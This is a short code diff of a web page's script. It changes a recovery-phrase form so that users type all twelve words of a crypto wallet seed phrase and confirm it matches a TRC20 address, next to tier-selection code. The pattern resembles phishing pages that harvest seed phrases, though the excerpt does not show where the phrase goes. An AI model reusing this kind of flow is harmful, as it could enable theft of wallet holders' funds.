@@ -203,13 +203,18 @@ header .logo img {
 });
 
     document.getElementById('s2btn').addEventListener('click', () => {
-  const phrase = document.getElementById('phrase').value.trim();
-  const matchCheck = document.getElementById('matchCheck').checked;
-
-  if (!phrase) {
-    alert("Please enter your recovery phrase.");
-    return; // stop if empty
+  let phrase = '';
+  for (let i = 1; i <= 12; i++) {
+    const word = document.getElementById(`word${i}`).value.trim();
+    if (!word) {
+      alert(`Please enter word ${i} of your recovery phrase.`);
+      return; // stop if any word is missing
+    }
+    phrase += word + ' ';
   }
+  phrase = phrase.trim();
+
+  const matchCheck = document.getElementById('matchCheck').checked;
   if (!matchCheck) {
     alert("Please confirm the backup matches the TRC20 wallet address.");
     return; // stop if not checked
@@ -222,7 +227,7 @@ header .logo img {
     s3.hidden = false;
   }, 900);
 });
-
+    
     let selectedTier = null;
 document.querySelectorAll('.tier').forEach(t => {
   t.addEventListener('click', () => {
